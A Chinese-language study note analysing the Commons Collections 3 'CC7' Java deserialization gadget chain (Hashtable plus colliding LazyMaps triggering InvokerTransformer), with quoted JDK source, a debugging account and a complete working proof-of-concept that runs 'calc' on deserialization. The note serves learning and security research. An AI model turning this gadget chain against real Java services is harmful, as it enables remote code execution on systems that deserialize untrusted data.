---
title: CC7链分析
description: Commons Collections 3 Hashtable + LazyMap 反序列化链，通过 equals() 触发 LazyMap.get() 和 InvokerTransformer 执行命令
tags: [cc7, commons-collections, deserialization, hashtable, lazymap]
status: 已完成
finish-date: 2026-05-19
difficulty: 困难
---

# CC7链
## 扫除前障
1. 装饰器模式的结构模型和方法调用
    1. 结构模型![](java-deserialization(ing)/2026-05-18-22-07-45.png)
    2. super(map) 让父类的 map 字段等于了 LazyMap 内层的那个普通 Map，所以 LazyMap.equals() 实际上是由这个内层 Map 去执行的
    3. 设计意图：装饰器模式（Decorator Pattern）的特点——装饰类（LazyMap）把核心操作委托给被装饰的对象（内层Map），自己只负责添加额外功能（懒加载）
2. 哈希表中的桶【一句话：桶就是哈希表数组中的一个位置，用来存放哈希值相同的多个键值对。】
    1. 什么是桶：哈希表（如 Hashtable、HashMap）内部有一个数组，这个数组的每个位置就叫做一个桶（Bucket）。 
    2. 桶的作用：用来存放哈希值相同的entry
        不同的 key 可能计算出相同的哈希值（哈希冲突）
        所有哈希值相同的 Entry，都放在同一个桶里
        桶里用链表把多个 Entry 串起来
    3. 图解：桶和链表的关系![](java-deserialization(ing)/2026-05-18-23-47-19.png) 
3. 为什么要让两个LazyMap的 hashCode 相等
    为了让 Hashtable 在反序列化时把它们放在同一个哈希桶里，从而触发 equals 比较，进而执行攻击链。 
4. 为什么选 "yy" 和 "zZ"作为lazyMap的键？
    Hashtable 不允许重复的 key。这两个字符串的 hashCode 恰好相等，让两个LazyMap的key分别等于这两个字符串值都等于1就可以让两个LazyMap的hashcode相等 
## 调用链
```
Hashtable.readObject()
|
Hashtable.reconstitutionPut()
    |
    e.key.equals(key)                //LazyMap.equals()
    |
    AbstractMapDecorator.equals()   // LazyMap父类的方法
        |
        HashMap.equals()              
        |
        AbstractMap.equals()         // 实际触发点
        |
        LazyMap.get()              
            |
            ChainedTransformer.transform()
                |
                ConstantTransformer.transform()
                |
                InvokerTransformer.transform()
``` 
## 关键类源码
1. Hashtable.readObject()
   ```java
   private void readObject(java.io.ObjectInputStream s)
      throws IOException, ClassNotFoundException {
      // ...
   for (; elements > 0; elements--) {
               @SuppressWarnings("unchecked")
                  K key = (K)s.readObject();
               @SuppressWarnings("unchecked")
                  V value = (V)s.readObject();
               reconstitutionPut(table, key, value);//关键调用
         }
      }
   ```
   反序列化时会用到reconstitutionPut方法
2. reconstitutionPut()
   ```java
   private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
         throws StreamCorruptedException
      {
         if (value == null) {
               throw new java.io.StreamCorruptedException();
         }
         int hash = key.hashCode();
         int index = (hash & 0x7FFFFFFF) % tab.length;
         for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
               if ((e.hash == hash) && e.key.equals(key)) {
                  throw new java.io.StreamCorruptedException();
               }
         }
      }
   ```
   如果两个key的hashcode相同就会执行e.key.equals(key)，攻击者可以控制e.key=LazyMap1，key=LazyMap2，LazyMap没有equals方法所以会调用父类的，即AbstractMappDecorator.equals(LazyMap2)  
3. AbstractMappDecorator.equals()
   ```java
   public boolean equals(Object object) { //参数参入的是key2
      if (object == this) {
         return true;
      }
      return map.equals(object);         
   }
   ``` 
   此时map的类型为HashMap，HashMap没有equals方法，会调用父类的，即AbstractMap.equals(LazyMap2)
4. AbstractMap.equals()
   ```java
   public boolean equals(Object o) {
         if (o == this)
               return true;

         if (!(o instanceof Map))
               return false;
         Map<?,?> m = (Map<?,?>) o;
         if (m.size() != size())
               return false;

         try {
               Iterator<Entry<K,V>> i = entrySet().iterator();
               while (i.hasNext()) {
                  Entry<K,V> e = i.next();
                  K key = e.getKey();
                  V value = e.getValue();
                  if (value == null) {
                     if (!(m.get(key)==null && m.containsKey(key)))
                           return false; // 触发LazyMap.get()
                  } else {
                     if (!value.equals(m.get(key))) // 二次触发点
                           return false;
                  }
               }
         } catch (ClassCastException unused) {
               return false;
         } catch (NullPointerException unused) {
               return false;
         }

         return true;
      }
   ```
   遍历LazyMap1的entrySet与LazyMap2的entry比较，会触发m.get(key)，即LazyMap.get()
## 手工POC
1. 构造的关键点
   1. 要让LazyMap1和LazyMap2的hashcode相等
   2. 在Hashtable中放入LazyMap1和LazyMap2这两个key之前要把LazyMap2的factory设为无害的然后再用反射修改为ChainedTransformer，放入Hashtable之后要remove清除LazyMap2中的键值对缓存
      因为Hashtable的put方法会和reconstitutionPut方法有一样的调用导致调用链在构造阶段（攻击者本地） 就会被提前触发同时回事LazyMap2中出现关于LazyMap1中的key的键值对缓存导致反序列化时LazyMap.get()直接返回缓存的value而不是执行factory.transform()导致调用链无法触发
2. 验证poc发现并没有执行弹出计算器的命令![](java-deserialization(ing)/2026-05-19-03-06-25.png)
   1. 因为我想当然的以为反序列化时是按照我设想的m1.equals(m2)所以只把m2的factory设为恶意ChainedTransformer，没有吧m1也设置。但实际上可能是 m1.equals(m2)，也可能是 m2.equals(m1)这取决于迭代顺序（不确定）。所有要把两个LazyMap的factory都设置为ChainedTransformer
   2. 我在创建ChainedTransformer对象时直接把恶意链放入其中` ChainedTransformer ctChain = new ChainedTransformer(new Transformer[]{ct,it,it2,it3});`
   3. 调试查看哪里出了问题
      1. 关键位置打上断点
      2. 发现问题：当运行到`map2.put("zZ", 1);`时会触发问题![](java-deserialization(ing)/2026-05-19-09-22-35.png)
      3. 当运行到开始反序列化时我突然发现Hashtable中只有m1一个元素，为什么m2没有被放入![](java-deserialization(ing)/2026-05-19-09-44-10.png)
      4. 在Hashtable.put()中加断点![](java-deserialization(ing)/2026-05-19-09-53-07.png)
      5. 在AbstractMap.equals()中加断点观察是否返回true![](java-deserialization(ing)/2026-05-19-10-00-46.png)
      6. 发现确实跳转到true了这也就是为什么Hashtable中只有m1一个元素了![](java-deserialization(ing)/2026-05-19-10-02-25.png)
      7. 我把factory设为ConstantTransformer(1)当m2.get("yy")时发现没有这个key就调用factory.transform("yy")获取value但巧合的是factory是ConstantTransformer(1)会让m2中yy对于的值恰好是1等于m1中yy的value【1】，返回true从而导致不会把m2加入到Hashtable中
      8. 为了验证是否是我猜想的巧合导致的，我把m2初始的factory设为2![](java-deserialization(ing)/2026-05-19-10-08-47.png)发现成功弹出计算器证明猜想正确
      9. 改进为了防止再出现这种问题，直接初始时使用空的 Transformer 数组
         ```java
         // 初始时使用空的 Transformer 数组
         Transformer[] transformers = new Transformer[]{};
         ChainedTransformer ctChain = new ChainedTransformer(transformers);

         // ... 创建 LazyMap 时使用空的 ctChain
         Map m1 = LazyMap.decorate(map1, ctChain);
         Map m2 = LazyMap.decorate(map2, ctChain);

         // ... 放入 Hashtable

         // 序列化前才反射替换为真正的恶意链
         ctChain = new ChainedTransformer(new Transformer[]{ct,it,it2,it3});            
         ```
3. 完整POC
   ```java
   import org.apache.commons.collections.Transformer;
   import org.apache.commons.collections.functors.ChainedTransformer;
   import org.apache.commons.collections.functors.ConstantTransformer;
   import org.apache.commons.collections.functors.InvokerTransformer;
   import org.apache.commons.collections.map.LazyMap;
   import java.io.*;
   import java.lang.reflect.Field;
   import java.util.HashMap;
   import java.util.Hashtable;
   import java.util.Map;

   public class CC7 {
      public static void main(String[] args) throws Exception {
         ConstantTransformer ct = new ConstantTransformer(Runtime.class);
         InvokerTransformer it = new InvokerTransformer("getMethod",
               new Class[]{String.class,Class[].class},
               new Object[]{"getRuntime",new Class[0]}
         );
         InvokerTransformer it2 = new InvokerTransformer(
               "invoke",
               new Class[]{Object.class,Object[].class},
               new Object[]{null,new Object[0]}
         );
         InvokerTransformer it3 = new InvokerTransformer(
               "exec",
               new Class[]{String.class},
               new Object[]{"calc"}
         );
         Transformer[] transformers = new Transformer[]{};
            ChainedTransformer ctChain = new ChainedTransformer(transformers);
            

            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy", 1);
            map2.put("zZ", 1);

         
               Map m1 = LazyMap.decorate(map1, ctChain);
               Map m2 = LazyMap.decorate(map2, ctChain);

               Hashtable ht = new Hashtable();
               ht.put(m1, 1);
               ht.put(m2, 1);


               ctChain= new ChainedTransformer(new Transformer[]{ct,it,it2,it3});
               Field f = LazyMap.class.getDeclaredField("factory");
               f.setAccessible(true);
               f.set(m2, ctChain);
               f.set(m1, ctChain);


               m2.remove("yy");


               ByteArrayOutputStream baos = new ByteArrayOutputStream();
               ObjectOutputStream oos = new ObjectOutputStream(baos);
               oos.writeObject(ht);
               oos.flush();
               byte[] bytes = baos.toByteArray();
               oos.close();
               System.out.println("Payload serialized successfully!");


               ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
               ObjectInputStream ois = new ObjectInputStream(bais);
               ois.readObject();
               ois.close();
               System.out.println("Payload executed successfully!");
      }
   }

   ```
## ysoserial验证
工具生成的payload也可以成功执行命令
![](java-deserialization(ing)/2026-05-19-10-56-10.png)